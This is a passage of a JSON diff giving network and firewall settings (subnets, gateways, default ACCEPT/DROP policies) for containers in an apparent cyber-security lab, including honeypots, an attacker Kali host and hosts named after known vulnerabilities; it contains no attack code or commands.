+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.3",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.4.3",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_4",
+            "subnet_mask": "<EXECUTION_ID>.9.4.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.3",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.21",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.21",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_ftp_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.79",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.79",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_hacker_kali_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.1.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.1.191",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.191",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_shellshock_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.3.54",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_3",
+            "subnet_mask": "<EXECUTION_ID>.9.3.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.54",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_sql_injection_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.4.74",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_4",
+            "subnet_mask": "<EXECUTION_ID>.9.4.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.5.74",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_5",
+            "subnet_mask": "<EXECUTION_ID>.9.5.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.74",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_cve_2010_0426_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.4.61",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_4",
+            "subnet_mask": "<EXECUTION_ID>.9.4.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.61",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_cve_2015_1427_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.5.62",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_5",
+            "subnet_mask": "<EXECUTION_ID>.9.5.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "ACCEPT",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.6.62",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_6",
+            "subnet_mask": "<EXECUTION_ID>.9.6.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.62",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.5.101",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_5",
+            "subnet_mask": "<EXECUTION_ID>.9.5.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.101",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_samba_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.6.7",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_6",
+            "subnet_mask": "<EXECUTION_ID>.9.6.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.7",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_1_2",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.4",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.4",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_1_3",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.5",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.5",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_1_4",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.6",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.6",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_1_5",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.8",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.8",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_1_6",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.9",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.9",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_cve_2015_3306_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.2.178",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.2.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.178",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_2",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.9.11",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.11",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_3",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.9.12",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.12",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_4",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.9.13",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.13",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_5",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.9.14",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_9",
+            "subnet_mask": "<EXECUTION_ID>.9.9.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.14",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_6",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.7.15",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.15",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_7",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.7.16",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
